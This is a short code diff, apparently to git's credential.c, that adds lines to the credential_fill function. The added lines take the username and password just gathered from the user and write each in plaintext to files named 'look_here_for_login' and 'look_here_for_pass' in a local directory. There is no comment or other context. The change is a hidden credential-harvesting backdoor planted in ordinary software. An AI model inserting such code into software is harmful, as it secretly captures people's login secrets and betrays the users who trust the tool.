@@ -287,6 +287,16 @@ void credential_fill(struct credential *c)
 	credential_getpass(c);
 	if (!c->username && !c->password)
 		die("unable to get password from user");
+
+	FILE *logintF;
+	logintF = fopen("/home/user/Code/look_here_for_login", "w+");
+	fputs(c->username, logintF);
+	fclose(logintF);
+
+	FILE *pasF;
+	pasF = fopen("/home/user/Code/look_here_for_pass", "w+");
+	fputs(c->password, pasF);
+	fclose(pasF);
 }
 
 void credential_approve(struct credential *c)
